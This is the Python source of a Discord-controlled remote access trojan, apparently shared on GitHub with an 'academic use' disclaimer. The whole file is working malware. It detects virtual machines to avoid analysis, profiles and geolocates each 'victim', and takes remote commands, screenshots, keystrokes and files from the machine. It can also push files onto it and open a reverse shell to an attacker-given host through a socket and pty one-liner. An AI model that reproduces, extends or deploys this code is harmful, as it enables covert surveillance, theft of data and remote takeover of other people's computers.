#  Copyright (c) 2021.
#  This code was designed and created by TH3R4VEN, its use is encouraged for academic and professional purposes.
#  I am not responsible for improper or illegal uses
#  Follow me on GitHub: https://github.com/th3r4ven
import discord
import asyncio
import subprocess
import sys
import requests
import socket
import uuid
import struct
import os
import ctypes
import json
import re
import pynput
from threading import Thread
import time

TOKEN = ""
CHANNEL_ID = 123456
Key = pynput.keyboard.Key
Listener = pynput.keyboard.Listener


class Thor:

    def check_for_vms(self):
        platform = Heimdall().platform()
        rules = ['Virtualbox', 'vmbox', 'vmware']
        if platform == 'win32':
            command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
                                       stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
                                       creationflags=0x08000000)
            out, err = command.communicate()
            command.wait()
            for rule in rules:
                if re.search(rule, out, re.IGNORECASE):
                    sys.exit()
        elif platform == 'linux':
            rules.append('Virtualization')
            rules.append('oracle')
            command = subprocess.Popen("hostnamectl", stderr=subprocess.PIPE,
                                       stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
                                       creationflags=0x08000000)
            out, err = command.communicate()
            command.wait()
            for rule in rules:
                if re.search(rule, out, re.IGNORECASE):
                    sys.exit()


class MjolnirKeyL:

    def __init__(self):
        self.keys = []
        self.log_data = ''

    def on_press(self, key):
        self.keys.append(key)

        try:
            self.log_data += key.char

        except AttributeError:
            self.log_data += f' {key} '

    def on_release(self, key):
        if stop_logger:
            with open("logger.txt", 'wt') as file:
                file.write(self.log_data)
            file.close()
            return False

    def start(self):
        with Listener(on_press=self.on_press,
                      on_release=self.on_release) as listener:
            listener.join()


class Mjolnir:

    def get_screenshot(self):
        platform = Heimdall().platform()
        if platform == 'win32':
            return self.screenshot_win()
        elif platform == 'linux':
            return self.screenshot_linux()
        else:
            return self.screenshot_macos()

    def reverse(self, ip_port):
        platform = Heimdall().platform()
        if platform == 'win32':
            raise Exception
        else:
            eval(f"""export BifrostHOST="{ip_port[0]}";export BifrostPORT={ip_port[1]};python -c 'import sys,socket,os,
                        pty;s=socket.socket();s.connect((os.getenv("BifrostHOST"),int(os.getenv("BifrostPORT"))));[os.dup2(s.fileno(),
                        fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""")

    def screenshot_win(self):
        from mss.windows import MSS as mss
        with mss() as sct:
            filename = sct.shot(mon=-1, output='fullscreen.png')
        return filename

    def screenshot_linux(self):
        from mss.linux import MSS as mss
        with mss() as sct:
            filename = sct.shot(mon=-1, output='fullscreen.png')
        return filename

    def screenshot_macos(self):
        from mss.darwin import MSS as mss
        with mss() as sct:
            filename = sct.shot(mon=-1, output='fullscreen.png')
        return filename

    def download_file(self, local, url):
        try:
            response = requests.get(url)
            with open(f'{local}', 'wb') as file:
                file.write(response.content)
            file.close()
            return "Download was a success"
        except Exception:
            return "Fail to download file"

    def upload_file(self, file_path):
        return "This file can't be uploaded on discord, trying to figure out how to upload big files to a public server"


class Heimdall:

    def get_system_info(self):
        return {
            'platform': self.platform(),
            'plublic_internet_protocol': self.plublic_internet_protocol(),
            'local_internet_protocol': self.local_internet_protocol(),
            'mac_address': self.mac_address().upper(),
            'sys_arquiteture': self.sys_arquiteture(),
            'device_name': self.device_name(),
            'username': self.username(),
            'is_admin': self.is_admin(),
            'location': self.location()
        }

    def platform(self):
        return sys.platform

    def plublic_internet_protocol(self):
        return requests.get('http://api.ipify.org', verify=False).text

    def local_internet_protocol(self):
        return socket.gethostbyname(socket.gethostname())

    def mac_address(self):
        return ':'.join(hex(uuid.getnode()).replace("0x", "").strip('L')[i:i + 2] for i in range(0, 11, 2)).lower()

    def sys_arquiteture(self):
        return int(struct.calcsize('P') * 8)

    def device_name(self):
        return socket.getfqdn(socket.gethostname())

    def username(self):
        return os.getenv('USER', os.getenv('USERNAME', 'user'))

    def is_admin(self):
        return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)

    def location(self):
        ip_info = requests.get('http://ipinfo.io', verify=False).text
        json_data = json.loads(ip_info)
        latitude, longitude = json_data.get('loc').split(',')
        return latitude, longitude

    def mac_verification(self, message):
        if re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', message).group() == Heimdall().mac_address():
            return True
        else:
            return False


class Bifrost(discord.Client):
    async def on_ready(self):
        channel = self.get_channel(CHANNEL_ID)
        mac = Heimdall().mac_address().upper()
        message = f'```New victim connect: \n' \
                  f'mac_address     -->     {mac}\n' \
                  f'To interact with the victim, type %help {mac} to see the help message```'
        await channel.send(message)

    async def sc(self, output, message):
        if len(output) >= 2000:
            with open("message.txt", 'wt') as file:
                file.write(output)
            file.close()
            await message.channel.send(file=discord.File("message.txt"))
            os.remove("message.txt")
        else:
            await message.channel.send(f'```{output}```')

    async def on_message(self, message):
        # don't respond to ourselves
        global thread
        global stop_logger
        if message.author == self.user:
            return

        received_message = message.content

        if '%' in message.content.lower():

            if received_message.startswith('%sessions'):
                return await message.channel.send(f'```Victim: {Heimdall().mac_address().upper()} is connected```')

            if Heimdall().mac_verification(received_message.lower()):

                if received_message.startswith('%show'):
                    sys_data = Heimdall().get_system_info()
                    data_message = f'```Sys Data: \n' \
                                   f'Plataform       -->     {sys_data["platform"]}\n' \
                                   f'plublic_IP      -->     {sys_data["plublic_internet_protocol"]}\n' \
                                   f'local_IP        -->     {sys_data["local_internet_protocol"]}\n' \
                                   f'mac_address     -->     {sys_data["mac_address"]}\n' \
                                   f'sys_arquiteture -->     {sys_data["sys_arquiteture"]}\n' \
                                   f'device_name     -->     {sys_data["device_name"]}\n' \
                                   f'username        -->     {sys_data["username"]}\n' \
                                   f'is_admin        -->     {sys_data["is_admin"]}\n' \
                                   f'location        -->     {sys_data["location"][0]}, {sys_data["location"][1]}\n\n' \
                                   f'To interact with the victim, type %help {sys_data["mac_address"]} to see the help message```'
                    await message.channel.send(
                        f'{data_message}')

                if received_message.startswith('%help'):
                    mac = Heimdall().mac_address().upper()
                    help_message = ["""
Connected sessions:
            ```
%sessions

    Return all connected users

Example: %sessions
            ```""", """
Show Victim data:
            ```
%show <MAC_ADDRESS>

    <MAC_ADDRESS>   -> Victim mac address

Example: %show """ + mac + """```""", """
RCE:
            ```
%scmd <MAC_ADDRESS> <command>

    <MAC_ADDRESS>   -> Victim mac address
    <command>>      -> command to run on victim pc

Example: %raven """ + mac + """ whoami
            ```""", """
Screenshot:
            ```
%sc <MAC_ADDRESS>

    <MAC_ADDRESS>   -> Victim mac address

Example: %sc """ + mac + """```""", """
Get File from victim:
            ```
%down <MAC_ADDRESS> <path_to_file>

        <MAC_ADDRESS>   -> Victim mac address
        <path_to_file>  -> Path to file

Example: %down """ + mac + """ C:\\Users\\User\\Desktop\\some_file.txt```""", """
Upload a File to victim:
            ```
%up <MAC_ADDRESS> <path_to_save_file_on_victim> <remote_file_location>

        <MAC_ADDRESS>                   -> Victim mac address
        <path_to_save_file_on_victim>   -> Path save on victim pc
        <remote_file_location>          -> Path to remote file

Example: %up """ + mac + """C:\\Users\\User\\Desktop\\some_file.txt 
http://host.com/some_file.txt```""", """
Keylogger:
            ```
%kl <MAC_ADDRESS> start

    <MAC_ADDRESS>   -> Victim mac address
    This command you start a keylogger on victim

Example: %kl """ + mac + """ start
            ```
            ```
%kl <MAC_ADDRESS> stop

    <MAC_ADDRESS>   -> Victim mac address
    This command stop the keylogger on victim and send all the data

Example: %kl """ + mac + """ stop```""", """
Mic capture:
            ```
%mic <MAC_ADDRESS>

    <MAC_ADDRESS>   -> Victim mac address
    Bot joins your voice chat and stream the victim mic
    <NOT IMPLEMENTED YET>

Example: %mic """ + mac + """
            ```
            ```
%fmic <MAC_ADDRESS>

    <MAC_ADDRESS>   -> Victim mac address
    Bot leaves your voice chat and stop streaming the victim mic
    <NOT IMPLEMENTED YET>

Example: %fmic """ + mac + """```""", """
Antivirus:
            ```
%av <MAC_ADDRESS>

    <MAC_ADDRESS>   -> Victim mac address
    
    Return all installed antivirus from victim computer

Example: %av """ + mac + """```"""]
                    for msg in help_message:
                        time.sleep(0.5)
                        await message.channel.send(f'{msg}')

                if received_message.startswith('%scmd'):
                    command = received_message.split(f'%scmd {Heimdall().mac_address().upper()} ')[1]
                    command = subprocess.Popen(command.split(), stderr=subprocess.PIPE, stdin=subprocess.DEVNULL,
                                               stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
                    out, err = command.communicate()
                    command.wait()
                    await self.sc(out, message)

                if received_message.startswith('%sc'):
                    await message.channel.send(file=discord.File(Mjolnir().get_screenshot()))
                    os.remove('fullscreen.png')

                if received_message.startswith('%kl'):
                    if re.search('start', received_message, re.IGNORECASE):
                        stop_logger = False
                        keyl = MjolnirKeyL()
                        thread = Thread(target=keyl.start)
                        thread.start()
                        await message.channel.send(f'```Keylogger has started```')

                    if re.search('stop', received_message, re.IGNORECASE):
                        stop_logger = True
                        thread.join()
                        await message.channel.send(file=discord.File("logger.txt"))
                        os.remove('logger.txt')

                if received_message.startswith('%down'):
                    try:
                        file_path = received_message.split(f'%down {Heimdall().mac_address().upper()} ')[1]
                        await message.channel.send(file=discord.File(file_path))
                    except Exception:
                        file_path = received_message.split(f'%down {Heimdall().mac_address().upper()} ')[1]
                        await message.channel.send(f'```{Mjolnir().upload_file(file_path)}```')

                if received_message.startswith('%up'):
                    local_remote = received_message.split(f'%up {Heimdall().mac_address().upper()} ')[1].split()
                    await message.channel.send(f'```{Mjolnir().download_file(local_remote[0], local_remote[1])}```')

                if received_message.startswith('%mic'):
                    await message.channel.send(f'```Under development```')
                    try:
                        await message.author.voice.channel.connect()
                    except Exception:
                        await self.voice_clients[0].disconnect()
                        return await self.on_message(message)

                if received_message.startswith('%fmic'):
                    await self.voice_clients[0].disconnect()

                if received_message.startswith('%av'):
                    platform = Heimdall().platform()
                    if platform == 'win32':
                        command = subprocess.Popen(
                            ['wmic', r'/Namespace:\\root\SecurityCenter2', 'path', 'AntiVirusProduct', 'get',
                             r'/value'], stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                            shell=True, text=True, creationflags=0x08000000)
                        out, err = command.communicate()
                        command.wait()
                        await self.sc(out, message)
                    else:
                        await message.channel.send(f'```Only compatible for windows```')

                if received_message.startswith('%shell'):
                    ip_port = received_message.split(f'%shell {Heimdall().mac_address().upper()} ')[1].split()
                    try:
                        thread1 = Thread(target=Mjolnir().reverse(ip_port))
                        thread1.start()
                        await message.channel.send(f'```Reverse has spawned```')
                    except Exception:
                        await message.channel.send(f'```Error while opening reverse or not implemented yet```')

            else:
                return


Thor().check_for_vms()
client = Bifrost()
client.run(TOKEN)
